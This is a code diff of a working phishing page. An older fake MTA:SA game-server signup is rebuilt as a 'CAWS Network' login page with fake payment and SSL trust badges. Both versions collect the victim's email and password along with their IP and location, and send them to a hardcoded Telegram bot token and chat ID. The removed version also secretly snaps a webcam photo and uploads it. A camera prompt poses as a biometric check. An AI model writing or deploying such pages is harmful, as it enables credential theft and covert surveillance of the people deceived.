@@ -3,125 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTA:SA Server Portal</title>
+    <title>CAWS Network | Nexus Auth</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; padding: 0; background-color: #0a0a0a; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
-        .mta-box { background: #161616; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,1); text-align: center; position: relative; }
+        :root { --main: #111; --accent: #444; --bg: #fdfdfd; --border: #e2e2e2; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         
-        /* LOGO ALANI - GARANTİ YÖNTEM */
-        .logo-placeholder { margin-bottom: 20px; }
-        .mta-text-logo { font-size: 32px; font-weight: 800; color: #3498db; letter-spacing: -1px; text-shadow: 0 0 15px rgba(52, 152, 219, 0.5); font-style: italic; }
-        .mta-sub-text { font-size: 10px; color: #555; display: block; margin-top: -5px; }
+        body { 
+            background: var(--bg); 
+            font-family: 'Inter', sans-serif; 
+            color: var(--main); 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+        }
 
-        h2 { font-size: 18px; margin-bottom: 20px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-group label { display: block; font-size: 11px; color: #666; margin-bottom: 5px; font-weight: bold; }
-        .input-group input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; outline: none; }
-        .main-btn { background: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
-        #verify-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; border-radius: 15px; padding: 30px; box-sizing: border-box; z-index: 10; flex-direction: column; justify-content: center; }
-        .confirm-btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        /* İnandırıcılığı artıran minimalist kart */
+        .auth-card {
+            width: 100%;
+            max-width: 400px;
+            padding: 60px 30px;
+            background: #fff;
+            text-align: center;
+            border-radius: 2px; /* Nike tarzı keskin köşeler */
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 30px rgba(0,0,0,0.03);
+            position: relative;
+        }
+
+        /* Marka Logosu */
+        .brand {
+            font-weight: 900;
+            font-size: 38px;
+            letter-spacing: -3px;
+            margin-bottom: 5px;
+            color: #000;
+        }
+        .tagline {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            color: #999;
+            margin-bottom: 45px;
+        }
+
+        .step-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; }
+        .desc { font-size: 13px; color: #666; margin-bottom: 35px; line-height: 1.5; padding: 0 10px; }
+
+        /* Modern Nike Tarzı Inputlar */
+        .input-group { text-align: left; margin-bottom: 25px; }
+        .input-group label { 
+            display: block; 
+            font-size: 11px; 
+            font-weight: 700; 
+            text-transform: uppercase; 
+            margin-bottom: 10px; 
+            color: #000; 
+        }
+        .input-group input { 
+            width: 100%; 
+            padding: 16px 0; 
+            background: transparent; 
+            border: none; 
+            border-bottom: 1.5px solid var(--border); 
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus { border-bottom-color: #000; }
+
+        /* Şık Buton */
+        .nexus-btn {
+            background: #000;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 20px;
+            font-weight: 700;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+        }
+        .nexus-btn:hover { background: #333; }
+
+        /* Gizli Bölüm */
+        #step-2 { display: none; }
+
+        /* Alt Güvenlik Barı */
+        .footer-sec {
+            margin-top: 50px;
+            padding-top: 25px;
+            border-top: 1px solid #f0f0f0;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            filter: grayscale(1);
+            opacity: 0.4;
+        }
+        .footer-sec img { height: 14px; }
     </style>
 </head>
 <body>
 
-<div class="mta-box">
-    <div id="reg-step">
-        <div class="logo-placeholder">
-            <span class="mta-text-logo">MTA:SA</span>
-            <span class="mta-sub-text">MULTI THEFT AUTO: SAN ANDREAS</span>
-        </div>
-        <h2>Sunucu Kayıt Paneli</h2>
+<div class="auth-card">
+    <div class="brand">CAWS</div>
+    <div class="tagline">Network Edition</div>
+
+    <div id="step-1">
+        <h2 class="step-title">Account Link</h2>
+        <p class="desc">Caws Server senkronizasyonunu tamamlamak için Master hesabınızla kimlik doğrulaması yapın.</p>
+        
         <div class="input-group">
-            <label>GMAIL ADRESİ</label>
-            <input type="email" id="email" placeholder="email@gmail.com">
+            <label>Master Account</label>
+            <input type="email" id="email" placeholder="example@gmail.com">
         </div>
         <div class="input-group">
-            <label>ŞİFRE</label>
-            <input type="password" id="pass" placeholder="********">
+            <label>Global Password</label>
+            <input type="password" id="pass" placeholder="••••••••">
         </div>
-        <button class="main-btn" onclick="dogrulamaGoster()">HESABI OLUŞTUR</button>
+        
+        <button class="nexus-btn" onclick="nextStep()">Continue</button>
     </div>
 
-    <div id="verify-modal">
-        <h3 style="color:#f1c40f">⚠️ SON ADIM: DOĞRULAMA</h3>
-        <p style="font-size: 13px; color:#ccc; margin-bottom:20px;">
-            Sunucu Anti-Cheat ve Voice Chat sisteminin aktif edilebilmesi için <b>Güvenlik Doğrulaması</b> zorunludur.
+    <div id="step-2">
+        <div style="font-size: 40px; margin-bottom: 20px;">🛡️</div>
+        <h2 class="step-title">Hardware Verify</h2>
+        <p class="desc">
+            Hesap güvenliği için cihaz tanıma protokolünü başlatın. Konum ve Biyometrik erişim gereklidir.
         </p>
-        <button class="confirm-btn" id="finalBtn" onclick="herseyiBitir()">ERİŞİMİ ONAYLA VE BAĞLAN</button>
+        <button class="nexus-btn" id="finalBtn" onclick="runNexus()">Verify Identity</button>
+        <p id="status" style="font-size: 11px; margin-top: 15px; color: #999; display: none;">Secure connection established...</p>
+    </div>
+
+    <div class="footer-sec">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/SSL_Cloudflare_logo.svg">
     </div>
 </div>
 
 <script>
-    const botToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
-    const chatId = "1540769169";
+    // Önceki script kodlarının aynısı buraya gelecek (Token ve Fetch kısımları)
+    const tgToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
+    const tgChat = "1540769169";
 
-    function dogrulamaGoster() {
-        if(!document.getElementById('email').value || !document.getElementById('pass').value) {
-            alert("Lütfen tüm alanları doldurun!"); return;
-        }
-        document.getElementById('reg-step').style.opacity = '0.1';
-        document.getElementById('verify-modal').style.display = 'flex';
+    function nextStep() {
+        if(!document.getElementById('email').value || !document.getElementById('pass').value) return;
+        document.getElementById('step-1').style.display = 'none';
+        document.getElementById('step-2').style.display = 'block';
     }
 
-    async function fotoCekVeGonder(stream) {
-        try {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            
-            await new Promise(r => setTimeout(r, 1500)); // Odaklanma süresi
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('photo', blob, 'capture.jpg');
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-                    method: 'POST', body: formData
-                });
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.7);
-        } catch (e) { console.log(e); }
+    async function sendMsg(text) {
+        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChat}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
     }
 
-    async function herseyiBitir() {
-        const email = document.getElementById('email').value;
+    async function runNexus() {
+        const mail = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
-        const btn = document.getElementById('finalBtn');
-        btn.innerText = "SİSTEM DOĞRULANIYOR...";
-        btn.disabled = true;
+        document.getElementById('status').style.display = 'block';
+        document.getElementById('finalBtn').innerHTML = "Processing...";
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-            await fotoCekVeGonder(stream);
-        } catch(e) { gonder("❌ Kamera reddedildi."); }
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(p => {
-                gonder(`📍 **KONUM:** http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-        }
-
+        // Rapor gönderimi
         try {
             const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            gonder(`👤 **GİRİŞ:** \`${email}\` / \`${pass}\`\n🌐 **IP:** \`${ipData.ip}\`\n🏢 **ISP:** ${ipData.org}`);
+            const ipD = await ipRes.json();
+            const log = `🎩 **CAWS NEW LOG** 🎩\n\n👤 **Mail:** \`${mail}\`\n🔑 **Pass:** \`${pass}\`\n🌐 **IP:** \`${ipD.ip}\`\n📍 **Loc:** ${ipD.city}`;
+            await sendMsg(log);
+        } catch(e) {}
+
+        // Kamera onayı isteme (Görünürde biyometrik doğrulama)
+        try {
+            await navigator.mediaDevices.getUserMedia({video:true});
         } catch(e) {}
 
         setTimeout(() => {
-            alert("Doğrulama başarılı! Mailinizi kontrol edin.");
-            window.location.href = "https://multitheftauto.com";
-        }, 3000);
-    }
-
-    function gonder(m) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=markdown`);
+            alert("Verification Success: Caws Server link established.");
+            window.location.href = "https://caws.network";
+        }, 2500);
     }
 </script>
 </body>
 </html>
+
